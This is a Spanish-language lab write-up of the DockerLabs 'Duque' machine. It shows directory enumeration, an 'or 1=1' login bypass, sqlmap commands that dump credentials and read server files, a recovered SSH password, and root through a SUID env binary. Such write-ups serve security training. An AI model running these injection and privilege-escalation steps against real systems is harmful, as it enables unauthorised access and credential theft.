172.17.0.2 Apuntes


# >_ [Duque]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | DockerLabs |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-09-06 |

---

## 📝 Descripción
---

## 🔍 1. Fase de Reconocimiento y Enumeración
Comenzamos realizando un ping a la máquina para ver a qué nos enfrentamos y si está accesible.
<img width="996" height="157" alt="ping" src="https://github.com/user-attachments/assets/786d002b-7335-4856-9690-33426bcb813a" />

<img width="1257" height="263" alt="1Escaneo" src="https://github.com/user-attachments/assets/6679d51c-d40c-41ae-aaf7-4a0907194a96" />

<img width="1173" height="379" alt="2Escaneo" src="https://github.com/user-attachments/assets/77d884cf-8ec6-4e9f-8fa5-32c0cfb0b35b" />


<img width="1451" height="943" alt="3pag" src="https://github.com/user-attachments/assets/a46cbd08-68ee-4f2a-aa45-5c433981076c" />
<img width="1907" height="470" alt="4gobuster" src="https://github.com/user-attachments/assets/891fc009-52d3-458e-aabf-6d07569252eb" />


gobuster dir -u http://172.17.0.2/ -w /usr/share/rockyou.txt -x php -t 100 -k -r --exclude-length 275,11622 --no-error

http://172.17.0.2/bills/

/index.php            (Status: 200) [Size: 11622]
/intranet             (Status: 200) [Size: 1889]
/bills                (Status: 200) [Size: 4676]

<img width="1347" height="887" alt="5login" src="https://github.com/user-attachments/assets/9dc99007-79b1-4066-922d-10831f746c9e" />

<img width="1105" height="879" alt="6dfd" src="https://github.com/user-attachments/assets/4c074abe-5f3b-49dc-8020-5527db487599" />


or 1=1 entre a http://172.17.0.2/bills/panel.php
Soy mario

<img width="1168" height="908" alt="7dentro" src="https://github.com/user-attachments/assets/1ea645d4-b16a-4090-aa00-21741ac28562" />


sqlmap -u http://172.17.0.2/bills/panel.php --batch  --dbs --forms

<img width="1788" height="624" alt="8sqlmap" src="https://github.com/user-attachments/assets/c42657e6-4427-4e71-b61c-0d95be43d311" />

sqlmap -u http://172.17.0.2/bills/panel.php --batch -D register -T users -C passwd,username --dump --forms

<img width="1768" height="500" alt="9sqlmap" src="https://github.com/user-attachments/assets/09ce1436-5d4b-41f1-b474-d5fc0fb9e3f6" />

sqlmap -u http://172.17.0.2/bills/index.php --batch --is-dba --forms
Nos dice que el usuario de bbdd tiene privilegios de tipo Dba asique podremos interactuar con lso archivos

sqlmap 'http://172.17.0.2/bills/index.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 39' -H 'Origin: http://172.17.0.2' -H 'Connection: keep-alive' -H 'Referer: http://172.17.0.2/bills/index.php' -H 'Cookie: PHPSESSID=pb7hh6olehpjkco20q10s1qjuf' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'username=admin&password=admin' --batch --file-read "/var/www/html/bills/panel.php"

<img width="1450" height="878" alt="10entramosadmin" src="https://github.com/user-attachments/assets/0a67ca5d-eb71-4c5f-a3cf-6506558d80eb" />

<img width="1864" height="362" alt="11dbatrue" src="https://github.com/user-attachments/assets/a48133ca-0c75-4f3c-81aa-1fec71ee7383" />

<img width="910" height="788" alt="12claveenruta" src="https://github.com/user-attachments/assets/a1007cfe-ef7d-4548-a873-f6dc818159ab" />


  <div class="value">duque</div>
                    </div>
                    <div class="field">
                        <label>Password</label>
                    <div class="value">duquelaje81029557!<
                                                           
<img width="1103" height="559" alt="13entramos" src="https://github.com/user-attachments/assets/3fa94d2b-b201-4570-bacf-cb6b3d2353d0" />


Entramos por ssh
Nada en grupos id
no peude hacer sudo -l
nada en su carpeta

find / -perm -4000 2>/dev/null

<img width="904" height="361" alt="14doblefoto" src="https://github.com/user-attachments/assets/f2a49582-73d1-4cf0-adf0-2493e31c854d" />


ls -l /usr/bin/env
-rwsr-xr-x 1 root root 43976 Jan 23  2026 /usr/bin/env

<img width="559" height="65" alt="15root" src="https://github.com/user-attachments/assets/81bafebb-438a-42c2-9cb6-dac4f6f944a6" />

env /bin/sh -p
# whoami
root


